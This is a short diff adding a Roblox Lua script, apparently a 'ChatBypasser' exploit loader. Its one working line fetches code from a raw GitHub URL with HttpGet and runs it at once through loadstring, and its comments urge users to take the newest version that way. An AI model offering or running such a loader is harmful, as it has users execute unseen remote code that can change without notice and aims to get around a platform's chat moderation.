@@ -1,0 +1,4 @@
+-- Made by ArasOfficial#8439
+-- This script is patched. Please use the new version and use the loadstring to get newest versions.
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/legitimate0x1/ChatBypasser/main/Loader"), true))()
